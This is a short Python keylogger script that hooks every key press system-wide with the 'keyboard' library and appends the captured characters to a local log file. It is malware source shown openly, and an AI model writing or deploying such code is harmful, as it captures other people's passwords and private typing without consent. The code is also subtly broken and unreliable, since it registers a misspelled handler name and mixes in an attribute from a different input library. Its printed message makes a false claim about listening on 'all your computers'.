
import keyboard

def onPress(Key):
    with open('keylogs.txt', 'a') as logfile:
        if hasattr(Key, 'char'):  # for letter or number keys
            logfile.write(Key.char)
        else:  # For special keys like shift, enter...etc
            logfile.write(str(Key))

keyboard.on_press(OnPress)
print('Listening For keystrokes on all your computers! Do not type in other windows.')
keyboard.wait()
